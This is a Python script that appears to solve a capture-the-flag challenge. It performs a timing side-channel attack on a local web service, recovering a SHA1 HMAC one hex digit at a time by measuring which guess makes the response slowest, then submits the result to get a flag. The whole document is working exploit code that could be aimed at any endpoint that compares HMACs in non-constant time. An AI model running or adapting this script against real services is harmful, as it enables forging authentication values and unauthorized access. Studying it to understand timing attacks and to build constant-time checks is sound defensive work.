#!/usr/bin/env python3
import requests, time, statistics

URL = "http://localhost:9015/challenge"  # service endpoint
DIGEST_LEN = 40                           # sha1 hexdigest length
HEX = "0123456789abcdef"
TRIES_PER_GUESS = 20                     # increase if your host is noisy
PAD = "0"

s = requests.Session()

def avg_time(candidate_hex: str) -> float:
    payload = {"hmac": candidate_hex}
    samples = []
    for _ in range(TRIES_PER_GUESS):
        t0 = time.perf_counter()
        r = s.post(URL, json=payload, timeout=5)
        samples.append(time.perf_counter() - t0)
        time.sleep(0.01)  # small spacing to reduce burst noise
    return statistics.mean(samples)

def submit(h):
    return s.post(URL, json={"hmac": h}, timeout=5).text

prefix = ""
for i in range(DIGEST_LEN):
    scores = []
    for ch in HEX:
        guess = prefix + ch + PAD * (DIGEST_LEN - len(prefix) - 1)
        scores.append((avg_time(guess), ch))
    scores.sort(reverse=True)           # highest latency first
    best_ch = scores[0][1]
    prefix += best_ch
    print(f"[{i+1:02d}/{DIGEST_LEN}] best next nibble = {best_ch}  -> {prefix}")

    # Optional: early success check (rare before all 40 are known)
    maybe = submit(prefix)
    if '"flag"' in maybe:
        print("Got flag early:", maybe)
        break

print("Final submit:")
print(submit(prefix))
